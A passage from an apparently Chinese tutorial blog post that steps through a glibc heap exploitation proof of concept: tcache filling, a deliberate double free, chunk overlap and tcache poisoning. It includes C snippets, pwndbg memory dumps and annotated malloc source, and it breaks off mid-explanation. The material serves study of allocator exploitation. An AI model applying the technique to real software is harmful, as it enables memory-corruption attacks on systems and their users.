overlapping</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Now we are able to cause chunk overlapping&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Step 1: fill up tcache list&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">    <span class="built_in">free</span>(x[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620894249004-3999379d-5836-4012-8e3e-e4112a9e936a.png#clientId=uf85f1db1-0094-4&from=drop&id=uadbfdefa&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-13%2016.24.06.png&originHeight=658&originWidth=2750&originalType=binary&size=91116&status=done&style=none&taskId=u5fe5ceba-d16b-416f-aafa-47ac6295b80" alt="截屏2021-05-13 16.24.06.png"><br>然后我们释放 chunk_victim 堆块让其进入 unsortedbin 中（b 54-&gt;c）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620894312419-bee51936-27e7-4699-8611-f4fb62dd548b.png#clientId=uf85f1db1-0094-4&from=drop&id=ud747cbd3&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-13%2016.25.08.png&originHeight=656&originWidth=2746&originalType=binary&size=98112&status=done&style=none&taskId=ua1511c9e-edaa-4ff2-ae17-d856bbf34ed" alt="截屏2021-05-13 16.25.08.png"><br>现在的内存状况如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">400</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line"><span class="number">0x555555757010</span>:<span class="number">0x0000000000000000</span><span class="number">0x0700000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557570c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00005555557578c0</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk0(<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757260</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757360</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk1(<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757370</span>:<span class="number">0x0000555555757260</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757470</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk2(<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757480</span>:<span class="number">0x0000555555757370</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757580</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk3(<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757590</span>:<span class="number">0x0000555555757480</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757690</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk4(<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x5555557576a0</span>:<span class="number">0x0000555555757590</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557577a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk5(<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x5555557577b0</span>:<span class="number">0x00005555557576a0</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557578b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk6(<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x5555557578c0</span>:<span class="number">0x00005555557577b0</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557579c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_prev(<span class="built_in">malloc</span>)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757ad0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_victim(<span class="built_in">free</span>-unsortedbin)</span><br><span class="line"><span class="number">0x555555757ae0</span>:<span class="number">0x00007ffff7dcdca0</span><span class="number">0x00007ffff7dcdca0</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757be0</span>:<span class="number">0x0000000000000110</span><span class="number">0x0000000000000020</span> <span class="meta">#chunk(avoid top chunk)</span></span><br><span class="line"><span class="number">0x555555757bf0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757c00</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020401</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757c70</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>接下来我们释放 chunk_prev，释放过后 chunk_prev 会和 chunk_victim 合并（b 57-&gt;c）：</p><blockquote><p>这里在释放过程中使用了堆块的向前合并，具体 malloc 源代码如下：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">/* consolidate backward */</span></span><br><span class="line">   <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">......(省略堆块向后合并代码)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123; <span class="comment">//准备开始堆块的向前合并</span></span><br><span class="line">       <span class="comment">//进入此if语句</span></span><br><span class="line">     <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">     nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<span class="comment">//获取nextchunk的PREV_INUSE标志位</span></span><br><span class="line"><span class="comment">//nextinuse==0</span></span><br><span class="line">     <span class="comment">/* consolidate forward */</span></span><br><span class="line">       <span class="comment">//堆块的向前合并</span></span><br><span class="line">     <span class="keyword">if</span> (!nextinuse) &#123; <span class="comment">//nextinuse==0</span></span><br><span class="line">unlink(av, nextchunk, bck, fwd); <span class="comment">//正常的unlink</span></span><br><span class="line">size += nextsize;</span><br><span class="line">     &#125; <span class="keyword">else</span></span><br><span class="line">clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"><span class="comment">//省略一些无意义的代码......</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620895356363-8f0cdcfd-9906-45ad-ae8c-9d1286d27c6c.png#clientId=uf85f1db1-0094-4&from=drop&id=u97d87d05&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-13%2016.42.31.png&originHeight=656&originWidth=2750&originalType=binary&size=100838&status=done&style=none&taskId=ub78329b3-9074-4c75-8d5f-3a1d085d1fe" alt="截屏2021-05-13 16.42.31.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">400</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line"><span class="number">0x555555757010</span>:<span class="number">0x0000000000000000</span><span class="number">0x0700000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557570c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00005555557578c0</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk0(<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757260</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757360</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk1(<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757370</span>:<span class="number">0x0000555555757260</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757470</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk2(<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757480</span>:<span class="number">0x0000555555757370</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757580</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk3(<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757590</span>:<span class="number">0x0000555555757480</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757690</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk4(<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x5555557576a0</span>:<span class="number">0x0000555555757590</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557577a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk5(<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x5555557577b0</span>:<span class="number">0x00005555557576a0</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557578b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk6(<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x5555557578c0</span>:<span class="number">0x00005555557577b0</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557579c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000221</span> #chunk_prev(<span class="built_in">free</span>-unsortedbin)---</span><br><span class="line">    <span class="meta">#changed  |</span></span><br><span class="line"><span class="number">0x5555557579d0</span>:<span class="number">0x00007ffff7dcdca0</span><span class="number">0x00007ffff7dcdca0</span>  |</span><br><span class="line">    <span class="meta">#changed#changed  |</span></span><br><span class="line">......chunk_prev范围 ----|</span><br><span class="line"><span class="number">0x555555757ad0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_victim(<span class="built_in">free</span>-unsortedbin)|</span><br><span class="line">#注意：这里的size并不会清空   ｜</span><br><span class="line"><span class="number">0x555555757ae0</span>:<span class="number">0x00007ffff7dcdca0</span><span class="number">0x00007ffff7dcdca0</span> #这里的指针并不会清空    |</span><br><span class="line">......  |</span><br><span class="line"><span class="number">0x555555757be0</span>:<span class="number">0x0000000000000220</span><span class="number">0x0000000000000020</span> <span class="meta">#chunk(avoid top chunk)--------|</span></span><br><span class="line">    <span class="meta">#changed</span></span><br><span class="line"><span class="number">0x555555757bf0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757c00</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020401</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757c70</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>接下来我们在申请一个大小为 0x100 的堆块（b 60-&gt;c），这个堆块会从 tcachebin 中取得：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620952259763-0457be03-6e4d-4f51-80ca-0d672b27c9b5.png#clientId=u8e7e6c94-2c24-4&from=paste&height=336&id=u0e1bdf56&margin=%5Bobject%20Object%5D&name=image.png&originHeight=672&originWidth=2750&originalType=binary&size=95195&status=done&style=none&taskId=u9c23eb8d-c003-4c23-b8f0-76a97a919e1&width=1375" alt="image.png"><br>接下来我们将再次对 chunk_victim 进行 free（b 64-&gt;c）：</p><blockquote><p><strong>这里注意，在此次 free 之前（chunk_victim）已经被 free</strong></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"><span class="built_in">free</span>(a);<span class="comment">// a is already freed //free(a)==free(chunk_victim)</span></span><br><span class="line"><span class="comment">/*VULNERABILITY*/</span></span><br></pre></td></tr></table></figure><p>这一步十分的重要，这里选择引入 malloc 源码进行调试，进入_int_free 函数之后看一下程序的栈帧：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620952450250-061e2a58-d4cc-496b-882d-84f1803c6693.png#clientId=u8e7e6c94-2c24-4&from=paste&height=156&id=ucea079c2&margin=%5Bobject%20Object%5D&name=image.png&originHeight=312&originWidth=2746&originalType=binary&size=79793&status=done&style=none&taskId=u5e50e18f-00de-4796-b986-6f5e48aa764&width=1373" alt="image.png"><br>在之前的堆块合并过程中由于 chunk_victim 的 size 并没有被清空，且在此 POC 中存在 UAF 漏洞，我们可以再次对 chunk_victim 进行 free，此堆块 free 之后会进入 tcachebin 中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">   coincidence before aborting.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx]; <span class="comment">//检测double free</span></span><br><span class="line"> tmp;</span><br><span class="line"> tmp = tmp-&gt;next)</span><br><span class="line">      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">    <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">       few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_put (p, tc_idx);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#pwndbg&gt; bin</span></span><br><span class="line"><span class="meta">#tcachebins</span></span><br><span class="line">#<span class="number">0x110</span> [  <span class="number">7</span>]: <span class="number">0x555555757ae0</span> —▸ <span class="number">0x5555557577b0</span> —▸ <span class="number">0x5555557576a0</span> —▸ <span class="number">0x555555757590</span> —▸ <span class="number">0x555555757480</span> —▸ <span class="number">0x555555757370</span> —▸ <span class="number">0x555555757260</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="meta">#fastbins</span></span><br><span class="line">#<span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line">#<span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line">#<span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line">#<span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line">#<span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line">#<span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line">#<span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line"><span class="meta">#unsortedbin</span></span><br><span class="line"><span class="meta">#all: 0x5555557579c0 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x5555557579c0</span></span><br><span class="line"><span class="meta">#smallbins</span></span><br><span class="line"><span class="meta">#empty</span></span><br><span class="line"><span class="meta">#largebins</span></span><br><span class="line"><span class="meta">#empty</span></span><br><span class="line"><span class="meta">#pwndbg&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>在此上述过程中会检测 double free，但是这个 double free 查找的只是 tcachebin 中是否进行了二次释放，并不会检测此堆块是否在不同的 bin 中有二次释放，比如：无法检测堆块是否同时存在于 tcachebin 和 unsortedbin。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">400</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line"><span class="number">0x555555757010</span>:<span class="number">0x0000000000000000</span><span class="number">0x0700000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557570c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000555555757ae0</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk0(<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757260</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757360</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk1(<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757370</span>:<span class="number">0x0000555555757260</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757470</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk2(<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757480</span>:<span class="number">0x0000555555757370</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757580</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk3(<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757590</span>:<span class="number">0x0000555555757480</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757690</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk4(<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x5555557576a0</span>:<span class="number">0x0000555555757590</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557577a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk5(<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x5555557577b0</span>:<span class="number">0x00005555557576a0</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557578b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk6(<span class="built_in">malloc</span>)</span><br><span class="line"><span class="number">0x5555557578c0</span>:<span class="number">0x00005555557577b0</span><span class="number">0x0000000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557579c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000221</span> #chunk_prev(<span class="built_in">free</span>-unsortedbin)---</span><br><span class="line"><span class="number">0x5555557579d0</span>:<span class="number">0x00007ffff7dcdca0</span><span class="number">0x00007ffff7dcdca0</span>  |</span><br><span class="line">   |</span><br><span class="line">......chunk_prev范围 ----|</span><br><span class="line"><span class="number">0x555555757ad0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_victim(<span class="built_in">free</span>-unsortedbin)|</span><br><span class="line">   #chunk_victim(<span class="built_in">free</span>-tcachebin)  ｜</span><br><span class="line"><span class="number">0x555555757ae0</span>:<span class="number">0x00005555557577b0</span><span class="number">0x0000555555757010</span>  |</span><br><span class="line">    <span class="meta">#changed#changed           |</span></span><br><span class="line">#<span class="number">0x555555757ae0</span>:<span class="number">0x00007ffff7dcdca0</span><span class="number">0x00007ffff7dcdca0</span>  |</span><br><span class="line">......  |</span><br><span class="line"><span class="number">0x555555757be0</span>:<span class="number">0x0000000000000220</span><span class="number">0x0000000000000020</span> <span class="meta">#chunk(avoid top chunk)--------|</span></span><br><span class="line"><span class="number">0x555555757bf0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757c00</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020401</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757c70</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>接下来我们 malloc 大小为 0x120 的堆块，此次申请会对 unsortedbin 的 chunk_prev 和 chunk_victim 这个整体进行切割并且覆盖 chunk_victim 的指针（b 71-&gt;c）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// simple tcache poisoning</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Launch tcache poisoning&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里仍然选择引入源码调试，首先 malloc 会对 unsortedbin 中的 free chunk–chunk_prev 进行整理，根据前面的经验可以知道最终这个堆块被整理到了 smallbin 中：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620957251708-340ac024-29e0-4c8a-b92b-cae907727cec.png#clientId=u8e7e6c94-2c24-4&from=paste&height=338&id=ue0c0a74f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=676&originWidth=2748&originalType=binary&size=95323&status=done&style=none&taskId=u7d8a2ef7-2084-4553-8880-309eaf091d6&width=1374" alt="image.png"><br>现在 largebin 中没有合适的堆块，因此会使用 binmap 进行遍历：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620957627279-1a84d5b9-0bce-4713-892a-4a14e75e925c.png#clientId=u8e7e6c94-2c24-4&from=drop&id=u5ccf2b46&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-14%2010.00.23.png&originHeight=1800&originWidth=2880&originalType=binary&size=513901&status=done&style=none&taskId=ua2004da7-49c4-4d38-9171-bc89544746a" alt="截屏2021-05-14 10.00.23.png"><br>经过 binmap 的遍历之后程序会使用刚刚放入 smallbin 的 free chunk：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620957733442-19ed0ce5-bade-49dc-9503-443b5d414556.png#clientId=u8e7e6c94-2c24-4&from=drop&id=u19950ac7&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-14%2010.02.08.png&originHeight=1800&originWidth=2880&originalType=binary&size=497400&status=done&style=none&taskId=ufe7e0863-35c0-4cc4-a965-449cf4c0b57" alt="截屏2021-05-14 10.02.08.png"><br>之后会对 victim 进行 unlink：<br><img 